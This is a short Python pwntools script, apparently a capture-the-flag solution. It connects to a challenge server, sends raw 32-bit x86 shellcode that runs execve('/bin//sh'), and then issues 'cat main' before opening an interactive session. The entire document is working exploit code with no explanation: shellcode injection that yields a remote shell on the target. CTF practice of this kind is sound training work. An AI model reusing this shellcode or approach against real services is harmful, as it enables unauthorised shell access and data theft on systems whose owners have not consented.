from pwn import *

r = remote("01.linux.challenges.ctf.thefewchosen.com", 58527)

payload = b"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x31\xDB\x31\xC9\x31\xD2\x89\xE3\x83\xC0\x0B\xCD\x80"
r.sendline(payload)

r.sendline(b"cat main")

r.interactive()